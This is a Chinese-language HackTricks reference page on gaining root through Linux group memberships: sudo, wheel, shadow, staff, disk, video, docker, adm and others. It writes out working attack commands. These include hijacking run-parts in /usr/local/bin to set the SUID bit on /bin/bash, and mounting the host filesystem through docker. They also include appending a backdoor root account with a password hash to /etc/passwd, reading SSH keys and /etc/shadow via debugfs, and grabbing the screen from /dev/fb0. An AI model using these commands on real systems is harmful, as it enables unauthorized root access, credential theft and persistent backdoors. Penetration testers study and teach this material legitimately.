# 有趣的组 - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin 组

### **PE - Method 1**

**有时**，**默认情况下（或因为某些软件需要）**，你可以在 **/etc/sudoers** 文件中找到以下几行：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
这意味着，**属于 sudo 或 admin 组的任何用户都可以通过 sudo 执行任意操作**。

如果是这种情况，要**成为 root，只需执行**：
```
sudo su
```
### PE - Method 2

查找所有 suid 二进制文件，并检查其中是否存在二进制文件 **Pkexec**：
```bash
find / -perm -4000 2>/dev/null
```
如果你发现 binary **pkexec 是一个 SUID binary**，并且你属于 **sudo** 或 **admin**，那么你可能可以使用 `pkexec` 以 sudo 身份执行 binaries。\
这是因为通常这些 group 位于 **polkit policy** 中。该 policy 基本上会标识哪些 group 可以使用 `pkexec`。使用以下命令检查：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
在那里，你将找到哪些 groups 被允许执行 **pkexec**，以及在某些 Linux 发行版中，**默认情况下**会出现 **sudo** 和 **admin** groups。

要**成为 root，你可以执行**：
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
如果你尝试执行 **pkexec** 并遇到此 **错误**：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**这不是因为你没有权限，而是因为你在没有 GUI 的情况下未连接**。关于此问题的解决方法，请参见：[https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。你需要 **2 个不同的 ssh sessions**：<sup>[[1]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**有时**，在**/etc/sudoers**文件中，**默认**可以找到这一行：
```
%wheel	ALL=(ALL:ALL) ALL
```
这意味着，**任何属于 wheel 组的用户都可以通过 sudo 执行任意操作**。

如果是这种情况，若要**成为 root，只需执行**：
```
sudo su
```
## Shadow 组

属于 **group shadow** 的用户可以**读取** **/etc/shadow** 文件：
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
所以，读取该文件，并尝试 **crack 一些 hashes**。

在分析 hashes 时，关于锁定状态需要注意：
- 带有 `!` 或 `*` 的条目通常无法通过密码登录进行交互。
- `!hash` 通常表示曾设置过密码，之后被锁定。
- `*` 通常表示从未设置过有效的密码 hash。

即使直接登录被阻止，这些信息仍可用于账户分类。

## Staff Group

**staff**：允许用户在不需要 root 权限的情况下向系统（`/usr/local`）添加本地修改（请注意，`/usr/local/bin` 中的可执行文件位于任何用户的 PATH 变量中，并且可能会以相同名称的可执行文件“覆盖”`/bin` 和 `/usr/bin` 中的可执行文件）。可将其与组“adm”进行比较，后者更多与监控/安全相关。[\\[source\\]](https://wiki.debian.org/SystemGroups)<sup>[[2]](#references)</sup>

在 debian distributions 中，`$PATH` 变量表明，无论用户是否拥有特权，`/usr/local/` 都会以最高优先级运行。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
如果我们可以劫持 `/usr/local` 中的某些程序，就能轻松获取 root 权限。

劫持 `run-parts` 程序是一种轻松获取 root 权限的方法，因为大多数程序都会运行类似 `run-parts` 的程序（例如 crontab、SSH 登录时）。
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
或当新的 ssh 会话登录时。
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

此权限几乎**等同于 root access**，因为你可以访问机器中的所有数据。

文件：`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
请注意，使用 debugfs 还可以**写入文件**。例如，要将 `/tmp/asd1.txt` 复制到 `/tmp/asd2.txt`，可以执行：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
但是，如果你尝试**写入由 root 所有的文件**（例如 `/etc/shadow` 或 `/etc/passwd`），就会遇到“**Permission denied**”错误。

## Video Group

使用命令 `w`，你可以找到**当前登录系统的用户**，它会显示类似以下内容的输出：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** 表示用户 **yossi 已在该机器上物理登录**到一个终端。

**video group** 有权查看屏幕输出。基本上，你可以观察屏幕内容。为此，你需要以 raw data 的形式**获取屏幕当前图像**，并获取屏幕所使用的分辨率。屏幕数据可以保存在 `/dev/fb0` 中，你可以在 `/sys/class/graphics/fb0/virtual_size` 中找到该屏幕的分辨率。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
要**打开** **raw image**，可以使用 **GIMP**，选择 **`screen.raw`** 文件，并将文件类型选择为 **Raw image data**：

![Disk Group - Video Group: 要打开 raw image，可以使用 GIMP，选择 screen.raw 文件，并将文件类型选择为 Raw image data](<../../../images/image (463).png>)

然后将 Width 和 Height 修改为屏幕使用的尺寸，并检查不同的 Image Types（选择能够更好显示屏幕内容的类型）：

![Disk Group - Video Group: 然后将 Width 和 Height 修改为屏幕使用的尺寸，并检查不同的 Image Types（选择能够更好显示屏幕内容的类型）](<../../../images/image (317).png>)

## Root 组

默认情况下，**root 组的成员**似乎可以访问并**修改**某些 **service** 配置文件、某些 **libraries** 文件或其他可用于提升权限的**有趣内容**……

**检查 root 成员可以修改哪些文件**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker 组

你可以将**主机的 root 文件系统挂载到某个实例的卷上**，这样实例启动时会立即对该卷执行 `chroot`。这实际上会让你获得该机器上的 root 权限。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
最后，如果你不喜欢之前的任何建议，或者它们由于某些原因无法正常工作（docker api firewall？），你始终可以尝试**运行一个 privileged container 并从中逃逸**，具体说明见此处：

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

如果你对 docker socket 具有写权限，请阅读[**this post about how to escalate privileges abusing the docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**。**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

通常，**`adm`** 组的**成员**拥有**读取日志**文件的权限，这些文件位于 _/var/log/_ 内。\
因此，如果你已 compromise 了该组中的用户，应该务必**查看日志**。

## Backup / Operator / lp / Mail groups

这些组通常是**credential-discovery** vector，而不是直接获取 root 的 vector：
- **backup**：可能暴露包含 configs、keys、DB dumps 或 tokens 的 archives。
- **operator**：特定于 platform 的 operational access，可能 leak 敏感的 runtime data。
- **lp**：print queues/spools 可能包含 document contents。
- **mail**：mail spools 可能暴露 reset links、OTPs 和内部 credentials。

应将属于这些组视为高价值的数据暴露发现，并通过 password/token reuse 进行 pivot。

## Auth group

在 OpenBSD 中，如果使用了 **auth** 组，通常可以写入 _**/etc/skey**_ 和 _**/var/db/yubikey**_ 文件夹。\
这些权限可能被以下 exploit 滥用，以将 privileges **escalate** 到 root：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

## References

- [1] [pkexec/pkttyagent authentication without a GUI session (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)

{{#include ../../../banners/hacktricks-training.md}}
